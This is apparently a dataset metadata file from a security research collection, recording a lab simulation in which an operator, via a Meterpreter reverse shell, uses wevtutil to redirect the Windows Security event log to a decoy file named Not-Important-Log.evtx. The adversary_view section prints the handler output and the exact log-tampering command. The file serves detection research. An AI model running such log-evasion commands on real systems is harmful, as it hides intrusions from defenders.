@@ -1,0 +1,91 @@
+title: Modifying Security Event Log File Path via Modification of Log Configuration
+id: SDWIN-220705170038
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2022/07/05
+modification_date: 2022/07/05
+platform:
+- Windows
+type: atomic
+tags:
+- wevtutil
+- cmd
+- microsoft windows security auditing
+description: |-
+  After getting a shell with elevated privileges on the target, we used wevtutil.exe to modify the configuration of the Security event log.
+  
+  Event logs for Microsoft Windows Security Auditing are stored in a different file (Not-Important-Log.evtx) by changing the standard log path  C:\Windows\System32\Winevt\Logs\Security.evtx.
+
+  This dataset was generated using a Windows 10 Enterprise Evaluation edition (Version:21H1,OS Build:19043.1766) and Kali Linux (Version:2021.3).
+attack_mappings:
+  - technique: T1562
+    sub-technique: "002"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_wevtutil_modify_security_eventlog_path.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+      script:
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    msf6 exploit(multi/handler) > run
+    
+    [*] Started HTTPS reverse handler on https://10.0.10.104:8443
+    [*] https://10.0.10.104:8443 handling request from 10.0.10.102; (UUID: if81stxw) Staging x64 payload (201308 bytes) ...
+    [*] Meterpreter session 2 opened (10.0.10.104:8443 -> 127.0.0.1) at 2022-07-05 17:00:38 -0400
+    
+    meterpreter > shell
+    Process 1912 created.
+    Channel 1 created.
+    Microsoft Windows [Version 10.0.19043.1766]
+    (c) Microsoft Corporation. All rights reserved.
+    
+    C:\Users\pedro\Downloads>wevtutil get-log Security
+    wevtutil get-log Security
+    name: Security
+    enabled: true
+    type: Admin
+    owningPublisher: 
+    isolation: Custom
+    channelAccess: O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)
+    logging:
+      logFileName: %SystemRoot%\System32\Winevt\Logs\Security.evtx
+      retention: false
+      autoBackup: false
+      maxSize: 1000000000
+    publishing:
+      fileMax: 1
+    
+    C:\Users\pedro\Downloads>wevtutil set-log Security /logfilename:"C:\Windows\System32\winevt\Not-Important-Log.evtx"
+    wevtutil set-log Security /logfilename:"C:\Windows\System32\winevt\Not-Important-Log.evtx"
+    
+    C:\Users\pedro\Downloads>wevtutil get-log Security
+    wevtutil get-log Security
+    name: Security
+    enabled: true
+    type: Admin
+    owningPublisher: 
+    isolation: Custom
+    channelAccess: O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)
+    logging:
+      logFileName: C:\Windows\System32\winevt\Not-Important-Log.evtx
+      retention: false
+      autoBackup: false
+      maxSize: 1000000000
+    publishing:
+      fileMax: 1
+    
+    C:\Users\pedro\Downloads>
+
+
+
+references:
+- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
